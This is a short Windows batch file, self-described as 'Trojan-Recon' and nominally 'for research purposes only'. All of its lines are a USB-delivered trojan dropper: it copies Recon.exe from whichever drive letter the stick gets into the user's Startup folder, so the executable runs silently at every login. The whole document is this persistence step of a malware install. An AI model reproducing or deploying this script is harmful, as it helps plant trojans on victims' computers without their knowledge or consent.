REM +++++++++++++++++
REM |    vknife     |
REM +++++++++++++++++
REM
REM *~ Trojan-Recon ~*
REM
REM For research purposes only

REM test sources, bc we dont know what the USB drive will be named by the system
xcopy /s D:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s E:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s F:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s G:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM this shouldnt happen but if the drive is named weird
xcopy /s A:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s B:\Recon.exe "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"